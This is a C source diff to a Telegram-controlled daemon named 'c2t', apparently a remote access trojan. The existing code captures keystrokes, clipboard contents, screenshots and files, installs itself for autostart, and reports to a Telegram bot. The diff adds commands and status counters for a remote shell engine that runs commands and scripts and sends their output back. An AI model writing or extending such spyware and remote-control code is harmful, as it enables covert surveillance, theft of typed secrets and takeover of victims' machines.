@@ -213,6 +213,7 @@ typedef enum {
   CMD_RESTART_CLIPBOARD,
   CMD_RESTART_SCREENSHOT,
   CMD_RESTART_LOGS,
+  CMD_RESTART_SHELL,
   CMD_RESTART_ALL,
   CMD_INSTALL,
   CMD_UNINSTALL,
@@ -288,6 +289,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"restart_clipboard", CMD_RESTART_CLIPBOARD}, {"restart_clip", CMD_RESTART_CLIPBOARD}, {"reset_clipboard", CMD_RESTART_CLIPBOARD}, {"reset_clip", CMD_RESTART_CLIPBOARD},
   {"restart_screenshot", CMD_RESTART_SCREENSHOT}, {"restart_screen", CMD_RESTART_SCREENSHOT}, {"restart_shot", CMD_RESTART_SCREENSHOT}, {"reset_screenshot", CMD_RESTART_SCREENSHOT}, {"reset_screen", CMD_RESTART_SCREENSHOT}, {"reset_shot", CMD_RESTART_SCREENSHOT},
   {"restart_logs", CMD_RESTART_LOGS}, {"restart_log", CMD_RESTART_LOGS}, {"reset_logs", CMD_RESTART_LOGS}, {"reset_log", CMD_RESTART_LOGS},
+  {"restart_shell", CMD_RESTART_SHELL}, {"restart_sh", CMD_RESTART_SHELL}, {"reset_shell", CMD_RESTART_SHELL}, {"reset_sh", CMD_RESTART_SHELL},
   {"restart_all", CMD_RESTART_ALL}, {"reset_all", CMD_RESTART_ALL},
   {"install", CMD_INSTALL}, {"autorun", CMD_INSTALL}, {"startup", CMD_INSTALL}, {"install_autostart", CMD_INSTALL}, {"install_service", CMD_INSTALL},
   {"uninstall", CMD_UNINSTALL}, {"uninstall_autostart", CMD_UNINSTALL}, {"remove_autostart", CMD_UNINSTALL}, {"disable_autostart", CMD_UNINSTALL},
@@ -882,6 +884,18 @@ static void restart_subsystem_logs(void) {
   telegram_send_html(msg);
 }
 
+static void restart_subsystem_shell(void) {
+  c2t_log_info("listener", "Restarting shell subsystem...");
+  c2t_shell_subsystem_restart();
+  char msg[512];
+  snprintf(msg, sizeof(msg),
+           "🔄 <b>Shell &amp; Execution Subsystem Restarted</b>\n\n"
+           "• <b>Status:</b> 🟢 <b>READY</b>\n"
+           "• <b>Interactive Sessions:</b> ⚪ Terminated &amp; Cleaned\n\n"
+           "<i>All session process trees reaped and buffers flushed cleanly.</i>");
+  telegram_send_html(msg);
+}
+
 static void restart_subsystem_all(void) {
   const c2t_config_t *config = c2t_config_get();
   c2t_log_info("listener", "Restarting all subsystems in-place...");
@@ -903,6 +917,7 @@ static void restart_subsystem_all(void) {
   }
   c2t_log_sender_cleanup();
   (void)c2t_log_sender_init();
+  c2t_shell_subsystem_restart();
 
   char msg[768];
   snprintf(
@@ -911,7 +926,8 @@ static void restart_subsystem_all(void) {
       "• 📋 <b>Clipboard:</b> %s\n"
       "• ⌨️ <b>Keyboard:</b> %s\n"
       "• 📸 <b>Screenshots:</b> %s\n"
-      "• 📜 <b>Log Sender:</b> %s\n\n"
+      "• 📜 <b>Log Sender:</b> %s\n"
+      "• 💻 <b>Shell Engine:</b> 🟢 Reset &amp; Ready\n\n"
       "<i>All monitoring engines, worker threads, and memory buffers refreshed in-place.</i>",
       config->disable_clipboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
       config->disable_keyboard ? "❌ Disabled" : "🟢 Reset &amp; Active",
@@ -2069,18 +2085,27 @@ static void handle_command(const telegram_incoming_update_t *update,
     uint64_t file_count = c2t_files_get_total_files();
     uint64_t log_bytes = c2t_log_sender_get_total_bytes();
     uint64_t log_count = c2t_log_sender_get_total_dispatches();
-    uint64_t total_transferred = clip_bytes + kb_bytes + shot_bytes + file_bytes + log_bytes;
+    uint64_t shell_bytes = c2t_shell_get_total_bytes();
+    uint64_t shell_cmds = c2t_shell_get_total_commands();
+    uint64_t shell_scripts = c2t_shell_get_total_scripts();
+    uint64_t shell_fails = c2t_shell_get_failed_commands();
+    uint64_t total_transferred = clip_bytes + kb_bytes + shot_bytes + file_bytes + log_bytes + shell_bytes;
+
+    char shell_status_str[128] = {};
+    c2t_shell_get_status_info(shell_status_str, sizeof(shell_status_str));
 
     char clip_b_str[64] = {}, kb_b_str[64] = {}, shot_b_str[64] = {},
-         file_b_str[64] = {}, log_b_str[64] = {}, tot_b_str[64] = {};
+         file_b_str[64] = {}, log_b_str[64] = {}, shell_b_str[64] = {},
+         tot_b_str[64] = {};
     format_metric_bytes(clip_bytes, clip_b_str, sizeof(clip_b_str));
     format_metric_bytes(kb_bytes, kb_b_str, sizeof(kb_b_str));
     format_metric_bytes(shot_bytes, shot_b_str, sizeof(shot_b_str));
     format_metric_bytes(file_bytes, file_b_str, sizeof(file_b_str));
     format_metric_bytes(log_bytes, log_b_str, sizeof(log_b_str));
+    format_metric_bytes(shell_bytes, shell_b_str, sizeof(shell_b_str));
     format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));
 
-    char status_msg[1800];
+    char status_msg[2000];
     snprintf(status_msg, sizeof(status_msg),
              "🤖 <b>c2t Daemon Status</b>\n\n"
              "• <b>Status:</b> 🟢 Active &amp; Running\n"
@@ -2088,6 +2113,7 @@ static void handle_command(const telegram_incoming_update_t *update,
              "• <b>Keyboard Monitoring:</b> %s\n"
              "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
              "• <b>Screenshot Subsystem:</b> %s (Timer: %llu s)\n"
+             "• <b>Shell Engine:</b> %s\n"
              "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
              "• <b>File Uploads:</b> %s\n"
              "• <b>Window Info:</b> %s\n\n"
@@ -2096,19 +2122,23 @@ static void handle_command(const telegram_incoming_update_t *update,
              "• 📋 <b>Clipboard:</b> %s (%llu events)\n"
              "• ⌨️ <b>Keyboard:</b> %s (%llu keystrokes)\n"
              "• 📸 <b>Screenshots:</b> %s (%llu images)\n"
+             "• 💻 <b>Shell Output:</b> %s (%llu cmds, %llu scripts, %llu errs)\n"
              "• 📁 <b>Files:</b> %s (%llu files sent)\n"
              "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
              "📦 <b>Queue Limits:</b> %llu items / %llu MB",
              clip_status, kb_status, kb_target,
              kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
              shot_status, (unsigned long long)screenshot_get_interval(),
+             shell_status_str,
              config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
              (unsigned long long)config->telegram_log_interval_sec,
              config->telegram_send_files ? "Enabled" : "Disabled",
              config->telegram_send_window_info ? "Enabled" : "Disabled",
              tot_b_str, clip_b_str, (unsigned long long)clip_events, kb_b_str,
              (unsigned long long)kb_keys, shot_b_str,
-             (unsigned long long)shot_count, file_b_str,
+             (unsigned long long)shot_count, shell_b_str,
+             (unsigned long long)shell_cmds, (unsigned long long)shell_scripts,
+             (unsigned long long)shell_fails, file_b_str,
              (unsigned long long)file_count, log_b_str,
              (unsigned long long)log_count,
              (unsigned long long)config->queue_max_items,
@@ -2137,6 +2167,9 @@ static void handle_command(const telegram_incoming_update_t *update,
       restart_subsystem_screenshot();
     } else if (match_command(arg, "logs") || match_command(arg, "log")) {
       restart_subsystem_logs();
+    } else if (match_command(arg, "shell") || match_command(arg, "sh") ||
+               match_command(arg, "exec") || match_command(arg, "terminal")) {
+      restart_subsystem_shell();
     } else if (match_command(arg, "all")) {
       restart_subsystem_all();
     } else if (!*arg || match_command(arg, "daemon") ||
@@ -2153,6 +2186,8 @@ static void handle_command(const telegram_incoming_update_t *update,
           "Restart clipboard monitor\n"
           "• <code>/restart screenshot</code> (or <code>/restart_shot</code>) - "
           "Restart screenshot backend &amp; timer\n"
+          "• <code>/restart shell</code> (or <code>/restart_shell</code>) - "
+          "Terminate sessions &amp; restart shell engine\n"
           "• <code>/restart logs</code> (or <code>/restart_logs</code>) - "
           "Flush and restart log sender\n"
           "• <code>/restart all</code> (or <code>/restart_all</code>) - Reset "
@@ -2180,6 +2215,11 @@ static void handle_command(const telegram_incoming_update_t *update,
 
   case CMD_RESTART_LOGS: {
     restart_subsystem_logs();
+    break;
+  }
+
+  case CMD_RESTART_SHELL: {
+    restart_subsystem_shell();
     break;
   }
 
